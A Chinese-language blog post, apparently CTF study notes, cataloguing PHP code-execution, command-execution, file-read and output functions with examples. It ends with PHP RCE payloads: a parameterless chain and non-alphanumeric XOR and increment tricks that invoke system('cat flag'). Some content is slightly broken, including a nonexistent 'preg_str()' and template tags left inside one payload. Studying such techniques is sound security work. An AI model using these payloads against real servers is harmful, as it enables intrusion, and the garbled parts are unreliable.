---
title: 命令执行与代码执行：函数、绕过与无字母数字
date: 2026-11-22 08:04:00
author: Xendr1a
categories: [Web安全, Web基础]
tags: [RCE, 命令执行, PHP]
description: PHP/系统命令执行函数清单、文件读取函数、输出函数，以及无字母数字等过滤绕过。
toc: true
---

先列全危险函数（代码执行、系统命令、文件读取、输出），再讲禁用函数绕过、无字母数字 payload 与常见 WAF 规避。

## PHP 代码执行函数

```text
eval()、assert()、preg_replace()、call_user_func()、call_user_func_array()、create_function()、array_map()，preg_str()
```

## array_map()

- **作用**：将回调函数作用到数组元素上。
- **示例**：
```text
$arr = [1, 2, 3];
$res = array_map('strtoupper', ['a','b','c']);
print_r($res); // ['A','B','C']
```

**危险性**：若回调函数可控，能调用危险函数（如 `system`）。

## assert()

- **作用**：PHP5 之前主要用于断言；PHP5+ 可以执行字符串（类似 eval）。
- **语法**：
```text
assert(mixed $assertion);
```

**示例**：

```text
assert('$x = 5;'); // PHP 会执行这段代码
```

## call_user_func() ／ call_user_func_array()

- **作用**：动态调用函数。
- **语法**：
```text
call_user_func('strlen', 'abc'); // 3
call_user_func_array('max', [1,2,3]); // 3
```

**危险性**：如果用户可控第一个参数，就能调用任意函数，比如 `system`。

## create_function()

- **作用**：创建匿名函数（底层其实是用 `eval` 实现）。
- **语法**：
```text
$func = create_function('$x', 'return $x*$x;');
echo $func(5); // 25
```

**危险性**：执行字符串代码，PHP7.2+ 已弃用。

## eval

- **作用**：将字符串作为 PHP 代码执行。
- **语法**：`eval(string $code): mixed`

  **示例**：
```text
$a = 10;
eval('$b = $a + 5;');
echo $b; // 输出 15
```

## preg_replace()

- **作用**：正则替换。**但使用** **`/e`** **修饰符时，会把替换内容当作 PHP 代码执行**。
- **示例**（旧版本才支持 `/e`）：
```text
preg_replace('/.*/e', 'system("id")', 'test');
```

**危险性**：已废弃，但老项目里可能存在。

## preg_replace_callback()

- **作用**：用回调函数处理匹配结果。
- **示例**：
```text
preg_replace_callback('/\d+/', function($m){ return $m[0]*2; }, "123abc");
// 输出 246abc
```

**危险性**：若回调函数可控 → 任意函数执行。

## file()

- **作用**：把文件按行读取到数组。
- **示例:**
```text
print_r(file("/etc/passwd"));
```

## file_get_contents()

- **作用**：将整个文件读入字符串。
- **示例**：
```text
echo file_get_contents("/etc/passwd");
```

## fopen() + fread()

- **作用**：以流的方式读取文件。
- **示例**：
```text
$fp = fopen("/etc/passwd", "r");
echo fread($fp, 100);
fclose($fp);
```

## php_strip_whitespace()

- **作用**：读取 PHP 文件，但只返回**代码内容，不包括注释和空格**。
- **示例**：
```text
echo php_strip_whitespace("test.php");
```

## readfile()

- **作用**：直接输出文件内容。
- **示例**：
```text
readfile("/etc/passwd");
```

## show_source() ／ highlight_file()

- **作用**：输出并高亮 PHP 源代码。
- **示例**：
```text
highlight_file("test.php");
```

## 系统命令执行函数

```text
system()、passthru()、exec()、pcntl_exec()、shell_exec()、popen()、proc_open()、反引号（``）、ob_start()
```

## exec()

- **作用**：执行命令，**结果保存到数组/变量，不会直接输出**。
- **语法**：`exec(string $command [, array &amp;$output [, int &amp;$return_var]])`
- **示例**：
```text
exec("ls", $out);
print_r($out); // 输出目录列表
```

## passthru()

- **作用**：执行命令，并直接输出“原始结果”（适合二进制数据）。
- **示例**：
```text
passthru("ls -l");
```

## pcntl_exec()

- **作用**：替换当前进程为新程序。类似 Linux `exec()`。
- **示例**：
```text
pcntl_exec("/bin/ls", ["-l", "/"]);
```

## popen()

- **作用**：打开一个进程文件指针（可读写）。
- **示例**：
```text
$handle = popen("ls -l", "r");
echo fread($handle, 100);
pclose($handle);
```

## proc_open()

- **作用**：更复杂的进程控制，允许自定义管道。
- **示例**：
```text
$descriptorspec = [
    0 => ["pipe", "r"],  // 标准输入
    1 => ["pipe", "w"],  // 标准输出
    2 => ["pipe", "w"]   // 标准错误
];
$process = proc_open("ls -l", $descriptorspec, $pipes);
echo stream_get_contents($pipes[1]);
proc_close($process);
```

## shell_exec()

- **作用**：执行命令，返回 **完整字符串输出**。
- **示例**：
```text
$out = shell_exec("cat /etc/passwd");
echo $out;
```

## system()

- **作用**：执行外部命令，并输出结果。
- **语法**：`system(string $command [, int &amp;$return_var])`
- **示例**：
```text
system("whoami"); 
```

## 反引号（``）

- **作用**：直接执行命令（等同于 `shell_exec()`）。
- **示例**：
```text
echo `whoami`;
```

## 输出

- `echo`：输出字符串，速度快。
- `print`：和 `echo` 类似，但返回 1。
- `print_r()`：打印数组或对象，结构化展示。
- `printf()`：格式化输出。
- `sprintf()`：格式化返回字符串（不直接输出）。
- `var_dump()`：输出变量详细类型和值。
- `var_export()`：输出或返回变量的 **合法 PHP 表达式**。

## RCE

无参数rce

只靠函数套娃就能命令执行

```text
列举几个典型的
eval(end(pos(get_defined_vars())));&a=system('cat flag');
session_id();session_start();system(hex2bin(session_id()));#记得改cookiePHPSESSID
```

## 无字母数字

```text
$_="`{% raw %}{{{% endraw %}{"^"?<>/";${$_}[_](${$_}[__]);    &_=system&__=cat flag

$_="{% raw %}{{{% endraw %}{"^"?<>/";：通过异或运算（^`）生成字符串"_GET"。
```

```text
code=$_=[]._;$_=$_['_'];$_++;$_++;$_++;$__=++$_;$_++;$__=++$_.$__;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$__=$__.++$_;$_=_.$__;$$_[_]($$_[__]);
&_=system&__=cat flag

这是自增
$_=[]._;          // $_ 变为 "Array_"（因为 [] 转换为 "Array"，_ 是未定义常量被视为字符串 "_"）
$_=$_['_'];       // 访问字符串的第一个字符（索引0），所以 $_ 变为 "A"
$_++;$_++;$_++;   // 递增三次：从 "A" 到 "B" 到 "C" 到 "D"
$__=++$_;         // 前置递增：$_ 变为 "E"，然后 $__ 设置为 "E"
$_++;             // $_ 递增到 "F"
$__=++$_.$__;     // 前置递增：$_ 变为 "G"，然后 $__ 设置为 "G" . "E" = "GE"
// 接下来12次递增 $_
$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++; 
                 // $_ 从 "G" 递增到 "S"（经过12次）
$__=$__.++$_;    // 前置递增：$_ 变为 "T"，然后 $__ 设置为 "GE" . "T" = "GET"
$_=_.$__;        // _ 是未定义常量被视为 "_"，所以 $_ 变为 "_" . "GET" = "_GET"
$$_[_]($$_[__]); // 相当于 $_GET[_]($_GET[__])，从GET参数中获取函数和参数执行
```

/
